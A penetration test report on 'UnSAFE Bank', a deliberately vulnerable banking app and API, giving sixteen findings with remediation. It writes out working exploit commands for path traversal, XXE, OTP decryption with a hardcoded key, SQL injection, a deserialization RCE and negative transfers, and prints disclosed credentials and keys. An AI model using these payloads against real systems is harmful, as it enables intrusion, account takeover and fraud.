# UnSAFE Bank — Web & API Penetration Test Report

> **Redaction note.** This is a shareable copy of the report. All references to the target and operator host IPv4 addresses have been replaced with the placeholders `<TARGET_IP>` and `<OPERATOR_IP>`. No other content has been changed. Hardcoded secrets (DB password, JWT/AES keys), the disclosed OTP and the reset reference are **not** redacted in this copy — request a fully sanitised variant if this document will be shared outside the engagement team.

## 1. Engagement overview

| Item | Detail |
|---|---|
| Target (web) | `http://<TARGET_IP>:3000/` (nginx, React SPA "UnSAFE Bank") |
| Target (API) | `http://<TARGET_IP>/` (Apache 2.4.33 / PHP 7.2.7, CodeIgniter 3 REST API) |
| Operator host | `root@<OPERATOR_IP>` (DigitalOcean BLR1, egress IP <OPERATOR_IP>) |
| Authorization | Engagement lead confirmed the assets are self-hosted / owned by the client (written doc retained by the engagement lead) |
| Test window | Started 2026-09-20, UTC |
| Application | "UnSAFE Bank" — an intentionally vulnerable banking suite (lucideus-repo) deployed by the client |
| Report date | 2026-09-20 |

**Authorization note.** The brief's template referenced `example.com` / `api.example.com`, while the actual in-scope assets are the IP `<TARGET_IP>`. The engagement lead confirmed ownership/authorization for `<TARGET_IP>` before active testing began. Mail ports `25/465/587` were treated as out-of-scope mail infrastructure and were not tested.

## 2. Scope and rules of engagement

**In scope:** `http://<TARGET_IP>/` (API, TCP/80) and `http://<TARGET_IP>:3000/` (web, TCP/3000).
**Also observed:** SSH (TCP/22) — not attacked; SMTP (25/465/587) — **out of scope, untouched**.
**Out of scope (honoured):** subdomains, third-party SaaS, CDN/provider infra, mail infra, DNS control plane, pivot-only hosts.

**Constraints honoured:** no denial-of-service, no destructive writes to the client's seeded data, no persistence (the RCE PoC self-deleted), no exfiltration of real PII (only synthetic lab data, single-row proofs), no social engineering, no lateral movement. All test data created (two disposable users) is identified in the appendix.

## 3. Methodology

Phases executed in order: passive characterisation → active scanning (`nmap -sV` full TCP, conservative rate) → enumeration (service/framework fingerprint, source-assisted route mapping) → vulnerability analysis (source review cross-checked live) → controlled exploitation (minimum-impact PoCs) → reporting.

**Deviation from plan:** the application source was available locally in the working tree (`UnSAFE_Bank`). It was used to derive exact routes/parameters, then every finding was validated against the live target. No finding is based on source alone without being labelled **source-confirmed (not executed)**.

**Severity method:** CVSS v3.1 base scoring, adjusted by business impact. Authenticated findings assume a valid low-privilege account (obtained by self-signup, which the app allows).

## 4. Findings (ranked by risk)

### F1 — Unauthenticated arbitrary file read (path traversal) · **Critical**
- **Asset/endpoint:** `GET /api/Show?file=<path>`
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5** (raised to Critical given source/config disclosure → DB credentials)
- **CWE-22** Path Traversal; **OWASP A5:2017** Broken Access Control / **A3** Sensitive Data Exposure
- **Root cause:** `controllers/Show.php` concatenates user input onto a filesystem base and reads it:
  ```php
  $file = BASEPATH."../../".$this->input->get("file");
  $content = @file_get_contents($file);
  ```
  No authentication, no validation, no allowlist.
- **Reproduction:**
  ```bash
  curl -sS --path-as-is "http://<TARGET_IP>/api/Show?file=../../../../../../../../etc/passwd"
  curl -sS --path-as-is "http://<TARGET_IP>/api/Show?file=api/application/config/database.php"
  ```
- **Evidence:** `evidence/show_etc_passwd.txt`, `evidence/show_database_php.txt`. `/etc/passwd` returned (`root:x:0:0:root:/root:/bin/ash`), and `database.php` disclosed:
  `host=database`, `user=phpmyadmin`, `password=531486b2bf646636a6a1bba61e78ec4a4a54efbd`, `db=abstractwallet`.
- **Impact:** any file readable by the PHP process (application source, secrets, container files) is exposed unauthenticated; directly yields DB credentials.
- **Remediation:** remove the endpoint; never build filesystem paths from request input; if file serving is required, serve from a fixed allowlisted directory using `basename()` and canonical-path checks.

### F2 — Unauthenticated XXE (external entity / file disclosure) · **Critical**
- **Asset/endpoint:** `POST /api/ContactUs` (header `Accept: application/xml`)
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` = **8.6**
- **CWE-611**; **OWASP A4:2017** XML External Entities
- **Root cause:** `controllers/ContactUs.php` parses attacker XML with entity expansion enabled:
  ```php
  $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
  $xmlData = simplexml_import_dom($dom);
  ... $message = 'Thanks for contacting us ' . $name ...
  ```
- **Reproduction:**
  ```bash
  cat > xxe.xml <<'XML'
  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><name>&xxe;</name></r>
  XML
  curl -sS -H "Accept: application/xml" -H "Content-Type: application/xml" \
       --data-binary @xxe.xml http://<TARGET_IP>/api/ContactUs
  ```
- **Evidence:** `evidence/xxe_passwd_resp.txt` — `/etc/passwd` contents reflected inside `message`.
- **Impact:** unauthenticated file disclosure (and SSRF to internal `file://`/`http://` resources).
- **Remediation:** do not expand entities — drop `LIBXML_NOENT`/`LIBXML_DTDLOAD`, call `libxml_disable_entity_loader(true)` (PHP < 8), disable DTDs, or parse with a safe JSON path.

### F3 — Unauthenticated account takeover via OTP disclosure · **Critical**
- **Asset/endpoints:** `/api/Password/forgot` → `/api/Password/verifyuser` → `/api/Password/reset`
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1**
- **CWE-321 / CWE-330 / CWE-640**; **OWASP A2:2017** Broken Authentication
- **Root cause:** the password-reset OTP is returned to the caller, encrypted with a **hardcoded key and static IV** (`models/Model_otp.php`):
  ```php
  openssl_encrypt($sixDigitOTP, 'aes-256-cbc', "9bbc0d79e686e847bc305c9bd4cc2ea6",
                  OPENSSL_RAW_DATA, "0123456789abcdef")
  ```
  `Password::forgot` needs only a `userid`. Anyone can decrypt the OTP, verify it, obtain the reset reference and set a new password.
- **Reproduction (performed on a test account):**
  ```bash
  # 1) request OTP for the target userid
  curl -s -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"userid":"BNK48859","otp_type":"4"}}}' \
   http://<TARGET_IP>/api/Password/forgot          # -> data.response (base64 AES ciphertext)
  # 2) decrypt with the hardcoded key/IV
  echo "<response>" | base64 -d | openssl enc -d -aes-256-cbc \
       -K 3962626330643739653638366538343762633330356339626434636332656136 \
       -iv 30313233343536373839616263646566         # -> 6-digit OTP
  # 3) verify to obtain otp_ref, then 4) reset
  ```
- **Evidence:** `evidence/otp_forgot_resp.txt`, `evidence/decrypted_otp.txt` (`113460`), `evidence/otp_verify_resp.txt` (`otp_ref=099290147622469`), `evidence/otp_reset_resp.txt` (`PSW004 Password Reset Successful`).
- **Impact:** any user's password can be reset without authentication (full account takeover). Executed end-to-end against a disposable test account only.
- **Related:** `reset_user_passwd` validates the OTP reference independently of the target user (`$detailid` is used instead of the OTP owner `$result['id']`); the source itself carries the note *"replace the line 128 with 131 to patch account takeover"*. This is **source-confirmed** and was not executed against another user (see F9).
- **Remediation:** never return the OTP to the client; deliver it out-of-band to a factor the requester controls; use a CSPRNG; bind the OTP to the specific user and purpose; use authenticated encryption with a random IV from a server-side secret store. Remove the hardcoded key.

### F4 — Authenticated remote code execution via PHP object injection · **Critical**
- **Asset/endpoint:** `POST /api/Loan/apply`
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = **8.8** (RCE; would be 9.9 with `S:C`)
- **CWE-502** Deserialization of Untrusted Data; **CWE-434/CWE-22**; **OWASP A8:2017**
- **Root cause:** user-controlled `data.type` is Base64-decoded and `unserialize()`d with `LogWrite` allowed. The `LogWrite::__destruct` gadget writes attacker-controlled content to an attacker-chosen path (`APPPATH.'logs/'.$this->logfile`) with path traversal, then `chmod(0777)`:
  ```php
  $unserialized = unserialize(base64_decode($parsed['data']['type']), ["LogWrite"]);
  // LogWrite::__destruct:
  $file = APPPATH.'logs/'.$this->logfile;
  file_put_contents($file, $this->logdata, FILE_APPEND); chmod($file, 0777);
  ```
- **Reproduction (self-deleting PoC — nothing persisted):** send a serialized `LogWrite` with `logfile=../../../ub_poc.php` and `logdata=<?php echo 'NONCE'; @unlink(__FILE__); ?>`, then request the written file.
  ```bash
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"amount":"1","roi":"1","tenure":"1","type":"<base64 serialized LogWrite>"}}}' \
   http://<TARGET_IP>/api/Loan/apply
  curl -s "http://<TARGET_IP>/ub_poc.php"     # -> UBSAFE_POC_<ts>_OK ; file deletes itself
  ```
- **Evidence:** `evidence/loan_objectinjection_resp.txt` (`LOAN05`), `evidence/rce_proof.txt` (HTTP 200, body `UBSAFE_POC_1789879133_OK`). Follow-up request returned **HTTP 404**, confirming self-deletion. `evidence/` contains no residual shell.
- **Impact:** authenticated code execution as the web user (container) → full compromise of the API tier.
- **Remediation:** never `unserialize()` request data; use JSON. If unavoidable, `allowed_classes=false`. Constrain `LogWrite` to a fixed log directory with a safe filename; remove `chmod(0777)`.

### F5 — Broken access control / IDOR: mass PII disclosure · **High**
- **Asset/endpoint:** `POST /api/Account/details`
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = **6.5** (raised to High — regulated PII mass disclosure)
- **CWE-639 / CWE-284**; **OWASP A5:2017** Broken Access Control
- **Root cause:** only the *validity* of the session is checked; the requested `userid` is not compared to the session's account. The code comment claims *"validate accountid with userid to prevent IDOR"* but no such comparison exists (`models/Model_my_account.php`).
- **Reproduction:**
  ```bash
  # authenticate as any low-priv user, then request another cust_id
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"userid":"BNK45046"}}}' \
   http://<TARGET_IP>/api/Account/details
  ```
- **Evidence:** `evidence/idor_BNK45046.txt` — as test user `BNK48859` the response returned Vipul Malhotra's name, mobile, email, **Aadhaar**, **PAN** and balance; `BNK41565` likewise. `cust_id`s are `BNK` + 5 digits (enumerable).
- **Impact:** an authenticated user can harvest the full PII (Aadhaar, PAN, address, DOB, contact, balance) of every customer.
- **Remediation:** derive the account from the session, or explicitly assert `requested userid == session userid`; return only fields the caller is entitled to.

### F6 — Authenticated SQL injection (`Beneficiary/fetch`) · **High**
- **Asset/endpoint:** `POST /api/Beneficiary/fetch`
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1**
- **CWE-89**; **OWASP A1:2017** Injection
- **Root cause:** the alias is string-concatenated into SQL and its validator is **commented out** (`models/Model_beneficiary.php`):
  ```php
  $sql = "SELECT ... FROM beneficiary_details
          WHERE beneficiary_alias = '$ali' AND user_id_fk = ".$result['user_id_fk'];
  ```
  DB errors are returned to the caller (`"alias" => $error['message']`), enabling error-based extraction.
- **Reproduction:**
  ```bash
  # syntax-error proof
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"alias":"x'"'"'"}}}' \
   http://<TARGET_IP>/api/Beneficiary/fetch
  # error-based extraction (database/version/user)
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"alias":"zz'"'"' AND extractvalue(1,concat(char(126),(SELECT database()),char(126))) AND '"'"'a'"'"'='"'"'a"}}}' \
   http://<TARGET_IP>/api/Beneficiary/fetch
  ```
- **Evidence:** `evidence/sqli_errorbased_db.txt` → `XPATH syntax error: '~abstractwallet~'`, version `8.0.19`, `phpmyadmin@%`.
- **Impact:** DB read (and potentially write) as `phpmyadmin`; enables exfiltration of all customer data.
- **Remediation:** use bound parameters (as the rest of the codebase does); restore alias validation; do not return DB errors.

### F7 — Business logic: negative-amount fund transfer · **High**
- **Asset/endpoint:** `POST /api/Beneficiary/pay`
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5** (raised to High — direct financial impact)
- **CWE-840 / CWE-20**; **OWASP A6:2017** / business-logic flaw
- **Root cause:** amount validation accepts any numeric string including negatives, and the minimum-amount guard was **commented out** ("commenting to make -ve transactions"), so the balance arithmetic runs with a negative amount:
  ```php
  $payer_balance -= $amount;   // amount negative -> payer gains
  $payee_balance += $amount;   // payee loses
  ```
- **Reproduction (performed between two disposable accounts only):** add a beneficiary, obtain a purpose-3 OTP, then:
  ```bash
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"amount":"-1.00","alias":"BOBTEST","remarks":"neg test","otp_response":"<ref>"}}}' \
   http://<TARGET_IP>/api/Beneficiary/pay
  ```
- **Evidence:** `evidence/neg_transfer_resp.txt` (`BNF015 Payment done Successfully`, `updated_balance: 271629.77`); `neg_after_A.txt` payer `271628.77 → 271629.77`, `neg_after_B.txt` payee `572667.10 → 572666.10`. Both accounts are test accounts created for this test.
- **Impact:** an attacker who can add a victim's account as a beneficiary drains it by sending negative payments (payer is credited, payee debited).
- **Remediation:** require `amount > 0` and `>= minimum`; use `DECIMAL`; perform the debit/credit inside a transaction with row locking; reject sign tricks server-side.

### F8 — Password change does not verify the current password · **High**
- **Asset/endpoint:** `POST /api/Password/change`
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` = **8.1**
- **CWE-620**; **OWASP A2:2017** Broken Authentication
- **Root cause:** the old-password check is commented out ("For Insecure Change Password functionality"); any valid session token can change the password.
- **Reproduction:**
  ```bash
  curl -s -H "Authorization: <token>" -H 'Content-Type: application/json' --data \
   '{"requestBody":{"timestamp":"1","data":{"old_pass":"TotallyWrong9","new_pass":"Changed@1"}}}' \
   http://<TARGET_IP>/api/Password/change
  ```
- **Evidence:** `evidence/change_no_oldpass.txt` → `PSW008 Password Changed Successfully` with a deliberately wrong old password.
- **Impact:** stolen/forged session tokens (or XSS-lifted tokens) can be converted into permanent account takeover.
- **Remediation:** require and verify the current password; re-authenticate for sensitive actions.

### F9 — Cross-user password reset (OTP reference not bound to target user) · **Critical** *(source-confirmed, not executed against a third party)*
- **Asset/endpoint:** `POST /api/Password/reset`
- **CWE-640 / CWE-620**; **OWASP A2:2017**
- **Root cause:** `reset_user_passwd` validates the OTP reference from `otp_master` but resets the password of the account derived from the attacker-supplied `userid`. The OTP owner is fetched as `$result['id']` but the code uses `$detailid` (the target user's detail id) instead. The vendor comment states: *"replace the line 128 with 131 to patch account takeover."*
- **Impact:** with any valid, verified purpose-4 OTP reference (e.g. the attacker's own), the attacker can reset any other user's password by supplying that user's `userid`. Combined with F3 this is unauthenticated.
- **Reproduction path:** identical to F3 but substituting the victim `userid` in the reset call — **not executed**, to avoid modifying another user's credentials.
- **Remediation:** use the OTP owner (`$result['id']`) to resolve the account being reset and assert it equals the requested account.

### F10 — Weak password hashing (unsalted MD5) · **Medium**
- **Asset:** `user.password`; `models/LoginModuleHandler.php`, `models/Model_passwd.php`
- **CVSS v3.1:** `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` = **5.9**
- **CWE-916 / CWE-759**
- **Detail:** passwords are stored as `md5($pass)` with no salt. All 10 seeded users share the identical hash `4a6c79e78b71627b823378f96b6e44b4` (not recovered from a small candidate set), confirming no per-user salt.
- **Impact:** fast offline cracking; DB disclosure converts directly to credential compromise.
- **Remediation:** migrate to bcrypt/Argon2id with per-user salt; force a reset on migration.

### F11 — Hardcoded JWT signing key; PII embedded in tokens · **Medium**
- **Asset:** `models/LoginModuleHandler.php`
- **CVSS v3.1:** `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N` = **5.9**
- **CWE-798 / CWE-321**
- **Detail:** session tokens are JWTs (HS256) signed with the hardcoded key `unsafebank`; the payload contains the user's `acctNo`, name, address, DOB, mobile, email, Aadhaar and PAN (see `evidence/test_token.txt` payload). Session validity is DB-backed, so a forged token does not by itself bypass `is_valid_session`; the risk is secret-in-source and PII exposure in a client-held token.
- **Remediation:** move the secret to a secret store and rotate; keep PII out of the token; rotate the key.

### F12 — OTP brute-force / no lockout on fund transfers · **Medium**
- **Asset:** `models/Model_otp.php`, `controllers/Otp.php`
- **CWE-307**; **OWASP A2:2017**
- **Detail:** the code intentionally sets `remaining_attempts = -9` for `otp_type == 3`, so the decrement never reaches zero and the OTP is never invalidated ("This if else condition has been added intentionally for OTP brute force on fund transfer"). `Otp::verify` special-cases type 3 to suppress the attempts counter. A 6-digit OTP with unlimited attempts is brute-forceable.
- **Remediation:** enforce a fixed attempt limit and invalidation for all OTP types; add rate limiting.

### F13 — Security misconfiguration & information disclosure · **Medium**
- **Assets:** `http://<TARGET_IP>/info.php`, API error output, `:3000` source maps
- **CWE-200 / CWE-16**
- **Detail:**
  - `GET /info.php` → full `phpinfo()` dump (PHP 7.2.7, 87 KB).
  - CodeIgniter runs in **development** mode: verbose stack traces disclose absolute paths and line numbers (e.g. `models/Model_beneficiary.php` line 429).
  - Deployed JS **source maps** are public (`/static/js/main.f035a24d.chunk.js.map`, vendor map 4.9 MB).
  - Components are EOL: PHP 7.2.7 (PHP 7.2 EOL Jan 2020), Apache 2.4.33, CodeIgniter 3.
- **Remediation:** remove `phpinfo.php`; set `CI_ENV=production` (`display_errors=0`); disable/ship without source maps; upgrade PHP, CodeIgniter and Apache.

### F14 — CORS wildcard with credentials · **Medium**
- **Asset:** all API responses (Apache `.htaccess`, `my.apache.conf`)
- **CVSS v3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` = **6.1**
- **CWE-942**
- **Detail:** `Access-Control-Allow-Origin: *`, `Allow-Headers: *`, `Allow-Methods: *` together with `Access-Control-Allow-Credentials: true`. (Confirmed via `OPTIONS /api/Login`.)
- **Remediation:** allowlist specific origins; never combine `*` with credentials.

### F15 — Blind SSRF via profile avatar URL · **Medium** *(source-confirmed)*
- **Asset:** `POST /api/EditUser/editUserDetails`
- **CWE-918**
- **Detail:** `Model_edit_account::urlExists()` runs `curl_init($url)` on the user-supplied `avatar` URL (no host allowlist). The response body is not returned, but internal reachability is disclosed via success/failure. Allows probing of internal services (`database:3306`, metadata endpoints).
- **Remediation:** validate avatar URLs against an allowlist of trusted hosts; block RFC1918/link-local/metadata ranges.

### F16 — Signup reports success after a failed DB insert · **Low**
- **Asset:** `POST /api/Signup`
- **Detail:** when the `device` block is omitted, the `NOT NULL` inserts fail but the API still returns `SNUP02 Signup Successful` with a `userId` that does not exist (observed: `BNK33200`). Failures are not surfaced.
- **Remediation:** check DB errors and roll back; validate required parameters.

## 5. Attack narrative

The findings chain into a single unauthenticated-to-full-compromise path:

1. **Recon** identifies an EOL CodeIgniter 3 / PHP 7.2 API (`:80`) and a React SPA (`:3000`).
2. **Unauthenticated disclosure** — `Show` (F1) reads arbitrary files including `database.php` (DB credentials), and `info.php` (F13) leaks the environment.
3. **Unauthenticated takeover** — `Password/forgot` (F3) hands out the reset OTP encrypted with a hardcoded key; decrypt → verify → reset, taking over any known `userid`. The reset logic itself (F9) also permits cross-user resets.
4. **Authenticated escalation** — with any account, `Account/details` (F5) dumps all customers' PII, `Beneficiary/fetch` (F6) injects SQL, `Password/change` (F8) changes passwords without the old one, and the negative transfer (F7) drains funds.
5. **RCE** — `Loan/apply` (F4) deserializes attacker input into the `LogWrite` gadget, writing a web-accessible PHP file → code execution as the web user (demonstrated with a self-deleting PoC).

Result: from anonymous to database read, PII theft, financial manipulation and remote code execution, with no client-supplied credentials.

## 6. Positive observations

- **Login cool-down:** a 300-second re-authentication cool-down (`LGN005`) was enforced and observed.
- **OTP expiry / attempt limits:** OTPs expire after 300 s and most OTP types enforce an attempt counter.
- **Session timeout:** sessions expire after 900 s of inactivity.
- **Most SQL uses bound parameters**; injection is confined to the deliberately concatenated query.
- **Directory access denied:** Apache returns 403 for `application/` and `system/` paths.
- **Least-privilege DB title:** the API connects as a named user rather than root (though it remains high-impact due to other flaws).

## 7. Remediation roadmap

| Priority | Finding(s) | Action | Effort |
|---|---|---|---|
| P0 | F1, F2 | Remove `Show`; disable XML external entities / switch ContactUs to JSON | S |
| P0 | F3, F9 | Stop returning OTPs; bind OTP to user+purpose; remove hardcoded key/static IV; use CSPRNG + authenticated encryption | M |
| P0 | F4 | Replace `unserialize` with JSON; contain file writes; drop `chmod(0777)` | S |
| P0 | F5 | Enforce session↔userid authorization on `Account/details` | S |
| P0 | F6 | Parameterize `Beneficiary/fetch`; restore alias validation; suppress DB errors | S |
| P1 | F7, F8, F12 | Server-side amount/minimum checks and transactions; require current password; fixed OTP attempt limits | M |
| P1 | F10, F11 | Migrate to Argon2id/bcrypt; move JWT secret to a secret store and remove PII from tokens | M |
| P1 | F13 | Production mode, remove phpinfo, disable source maps, upgrade PHP/CI/Apache | M |
| P2 | F14, F15, F16 | CORS allowlist; avatar SSRF allowlist; surface insert failures | S |

## 8. Appendices

### A. Raw scan output
`/opt/engage/scans/nmap_tcp_all_20260920T043258Z.{xml,gnmap,txt}` — full TCP scan.

Open/filtered ports:
```
22/tcp   open      ssh   OpenSSH 9.6p1 Ubuntu
25/tcp   filtered  smtp           (out of scope – not tested)
80/tcp   open      http  Apache httpd (PHP/7.2.7)
465/tcp  filtered  smtps          (out of scope – not tested)
587/tcp  filtered  submission     (out of scope – not tested)
3000/tcp open      http  nginx/1.31.6
```

### B. Test data created during the engagement
| Cust ID | Purpose | Notes |
|---|---|---|
| `BNK48859` | primary disposable account (Alice Tester) | password changed during PoC |
| `BNK44505` | secondary disposable account (Bob Tester) | used as beneficiary for F7 |
| `BNK33200` | failed signup artifact | does not exist (see F16) |

No seeded/customer account was modified. The RCE PoC file was self-deleting and confirmed removed (HTTP 404).

### C. Artifact index (SHA-256)
See `/opt/engage/report/artifact-index.txt` (41 artifacts: evidence, PoC inputs, scans, fetched web content).

### D. Command audit log
`/opt/engage/audit.log` — 120 timestamped entries (UTC), each recording purpose, command and exit code. Logging helper: `/opt/engage/audit.sh`.

### E. Key evidence files
| Finding | File |
|---|---|
| F1 | `evidence/show_etc_passwd.txt`, `evidence/show_database_php.txt` |
| F2 | `evidence/xxe_passwd_resp.txt` |
| F3 | `evidence/otp_forgot_resp.txt`, `evidence/decrypted_otp.txt`, `evidence/otp_verify_resp.txt`, `evidence/otp_reset_resp.txt` |
| F4 | `evidence/loan_objectinjection_resp.txt`, `evidence/rce_proof.txt` |
| F5 | `evidence/idor_BNK45046.txt` |
| F6 | `evidence/sqli_errorbased_db.txt` |
| F7 | `evidence/neg_transfer_resp.txt`, `evidence/neg_after_A.txt`, `evidence/neg_after_B.txt` |
| F8 | `evidence/change_no_oldpass.txt` |
| F13 | `evidence/info_php.html` |

*End of report.*
